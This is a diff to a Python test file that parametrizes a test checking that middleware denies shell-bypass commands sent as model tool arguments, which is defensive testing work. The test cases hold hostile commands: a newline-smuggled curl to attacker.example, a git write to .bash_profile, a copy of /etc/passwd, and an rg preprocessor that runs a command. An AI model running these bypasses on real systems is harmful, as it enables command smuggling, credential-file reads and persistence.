@@ -1097,7 +1097,17 @@ async def test_concurrent_turns_keep_authority_and_ifc_scope_isolated(
 
 
 @pytest.mark.asyncio
-async def test_service_shell_newline_bypass_denied_through_live_middleware(
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git status\ncurl https://attacker.example",
+        "git log --no-ext-diff --no-textconv --format=format:pwned --output=/tmp/.bash_profile",
+        "git diff --no-ext-diff --no-textconv --no-index /etc/passwd /tmp/copy",
+        "rg --no-config --pre=touch /tmp/pwned pattern .",
+    ],
+)
+async def test_service_shell_bypass_denied_through_live_middleware(
+    command: str,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     """Model args must reach the sink gate before a service shell handler runs."""
@@ -1131,7 +1141,7 @@ async def test_service_shell_newline_bypass_denied_through_live_middleware(
             _tool_request(
                 auth_context,
                 tool_name="shell_exec",
-                args={"command": "git status\ncurl https://attacker.example"},
+                args={"command": command},
             ),
             handler,
         )
